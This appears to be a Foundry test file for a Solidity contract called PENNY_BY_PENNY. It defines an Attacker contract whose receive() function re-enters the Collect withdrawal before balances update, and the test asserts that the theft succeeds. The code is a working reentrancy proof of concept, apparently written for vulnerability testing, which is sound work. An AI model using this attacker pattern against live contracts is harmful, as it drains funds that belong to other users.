
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/PENNY_BY_PENNY.sol";

contract TestReentrancyPENNY_BY_PENNY is Test {
    PENNY_BY_PENNY public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new PENNY_BY_PENNY();
        _contractUnderTest.SetLogFile(address(_logFile));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.1 ether && attackVal < 50 ether);
        
        // We set MinSum to 2 * attackVal.
        // This ensures that a single withdrawal reduces the balance below MinSum.
        // If the contract is secure, a second re-entrant withdrawal should fail the MinSum check.
        uint256 minSum = attackVal * 2;
        
        _contractUnderTest.SetMinSum(minSum);
        _contractUnderTest.Initialized();

        // Fund the test contract to perform the setup deposit
        vm.deal(address(this), minSum);
        
        // Fund the victim contract with extra ETH to ensure it can pay out the re-entrant call
        vm.deal(address(_contractUnderTest), minSum * 2);

        // 1. Attacker deposits 'minSum' (e.g. 2 ETH)
        _attacker.setupAttack{value: minSum}(minSum);

        // 2. Warp time to satisfy block.timestamp > acc.unlockTime
        vm.warp(block.timestamp + 10);

        // 3. Trigger Attack
        // The attacker will withdraw 'attackVal' (1 ETH).
        // Then re-enter to withdraw another 'attackVal' (1 ETH).
        // Total withdrawn: 2 ETH.
        // If secure, the second call would fail because (2 ETH - 1 ETH) < MinSum (2 ETH).
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: Logic manipulation not verified.");
    }

    receive() external payable {}
}

contract Attacker {
    PENNY_BY_PENNY public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = PENNY_BY_PENNY(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        // Deposit funds to establish initial balance
        _victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        storedAttackVal = val;
        attackCallCount = 1;
        
        // Initiate the withdrawal
        _victim.Collect(val);

        // Verify Success:
        // We deposited 'val * 2' (via setupAttack with minSum).
        // We withdrew 'val' in the first call.
        // We withdrew 'val' in the re-entrant call.
        // If successful, our balance should be at least 'val * 2'.
        // (Note: We start with 0 balance after setupAttack sends funds to victim).
        if (address(this).balance >= val * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the vulnerable function
            // At this point, state (balance) has not been updated yet, so checks pass.
            _victim.Collect(storedAttackVal);
        }
    }
}
